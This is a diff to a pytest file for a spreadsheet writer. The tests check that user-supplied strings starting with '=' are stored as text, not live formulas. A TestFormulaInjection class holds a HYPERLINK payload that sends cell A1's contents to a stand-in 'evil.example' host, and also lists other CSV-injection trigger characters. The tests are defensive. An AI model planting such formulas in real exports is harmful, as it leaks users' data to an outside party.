@@ -2,9 +2,11 @@
 
 from __future__ import annotations
 
+import zipfile
 from datetime import date
 from decimal import Decimal
 from io import BytesIO
+from typing import Any
 
 import pytest
 
@@ -14,6 +16,7 @@ from tempest_fastapi_sdk.spreadsheet import (
     BR_PERCENT_FORMAT,
     DEFAULT_SHEET_STYLE,
     Column,
+    Formula,
     SheetStyle,
     SheetWriter,
     new_workbook,
@@ -179,22 +182,89 @@ class TestWriteRow:
         assert sheet.cell(row=1, column=3).value == Decimal("2930.00")
 
     def test_formula_stays_a_formula(self) -> None:
+        """An explicit :class:`Formula` is written as one."""
         workbook = new_workbook("Dados")
         sheet = workbook["Dados"]
-        SheetWriter(sheet, COLUMNS).write_row(["Total", None, "=SUM(C1:C9)"])
+        SheetWriter(sheet, COLUMNS).write_row(["Total", None, Formula("=SUM(C1:C9)")])
         assert sheet.cell(row=1, column=3).value == "=SUM(C1:C9)"
+        assert sheet.cell(row=1, column=3).data_type == "f"
 
     def test_formula_survives_the_round_trip_as_a_formula(self) -> None:
         """In memory any string survives; what matters is the written file."""
         workbook = new_workbook("Dados")
         SheetWriter(workbook["Dados"], COLUMNS).write_row(
-            ["Total", None, "=SUM(C1:C9)"],
+            ["Total", None, Formula("=SUM(C1:C9)")],
         )
         reopened = openpyxl.load_workbook(BytesIO(workbook_to_bytes(workbook)))
 
         cell = reopened["Dados"].cell(row=1, column=3)
         assert cell.value == "=SUM(C1:C9)"
         assert cell.data_type == "f"
+
+    def test_formula_requires_the_equals_sign(self) -> None:
+        """Without ``=`` Excel would show the text, so it is refused early."""
+        with pytest.raises(ValueError, match="must start with '='"):
+            Formula("SUM(C1:C9)")
+
+
+class TestFormulaInjection:
+    """A ``str`` that looks like a formula lands in the file as text.
+
+    Before the :class:`Formula` split, ``openpyxl`` bound every ``str``
+    starting with ``=`` as a formula, so a name such as
+    ``=HYPERLINK("https://evil.example","Clique")`` stored by a user became
+    a live link in every exported sheet.
+    """
+
+    PAYLOAD: str = '=HYPERLINK("https://evil.example/?d="&A1,"Clique")'
+
+    def _reopened_cell(self, write: Any) -> Any:
+        """Write through ``write``, save, reload and return cell A1.
+
+        Args:
+            write (Any): Callable receiving a fresh :class:`SheetWriter`.
+
+        Returns:
+            Any: Cell ``A1`` of the reloaded workbook.
+        """
+        workbook = new_workbook("Dados")
+        write(SheetWriter(workbook["Dados"], COLUMNS))
+        reopened = openpyxl.load_workbook(BytesIO(workbook_to_bytes(workbook)))
+        return reopened["Dados"].cell(row=1, column=1)
+
+    def test_body_cell_is_text(self) -> None:
+        """A body row keeps the payload as text."""
+        cell = self._reopened_cell(lambda w: w.write_row([self.PAYLOAD]))
+        assert cell.value == self.PAYLOAD
+        assert cell.data_type == "s"
+
+    def test_header_cell_is_text(self) -> None:
+        """A header row keeps the payload as text."""
+        cell = self._reopened_cell(lambda w: w.header_row([self.PAYLOAD]))
+        assert cell.value == self.PAYLOAD
+        assert cell.data_type == "s"
+
+    def test_title_cell_is_text(self) -> None:
+        """A title line keeps the payload as text."""
+        cell = self._reopened_cell(lambda w: w.title_block([self.PAYLOAD]))
+        assert cell.value == self.PAYLOAD
+        assert cell.data_type == "s"
+
+    def test_the_file_carries_no_formula_element(self) -> None:
+        """The XML itself, not only what ``openpyxl`` reads back."""
+        workbook = new_workbook("Dados")
+        SheetWriter(workbook["Dados"], COLUMNS).write_row([self.PAYLOAD])
+        with zipfile.ZipFile(BytesIO(workbook_to_bytes(workbook))) as archive:
+            xml = archive.read("xl/worksheets/sheet1.xml").decode()
+        assert "<f>" not in xml
+        assert 't="inlineStr"' in xml
+
+    @pytest.mark.parametrize("value", ["+1+2", "-3", "@SUM(A1)", "\t=1"])
+    def test_other_csv_triggers_are_already_text(self, value: str) -> None:
+        """Only ``=`` is a formula to ``openpyxl``; the rest stay strings."""
+        cell = self._reopened_cell(lambda w: w.write_row([value]))
+        assert cell.value == value
+        assert cell.data_type == "s"
 
     def test_dates_are_supported(self) -> None:
         columns = [Column("Data", number_format=BR_DATE_FORMAT)]
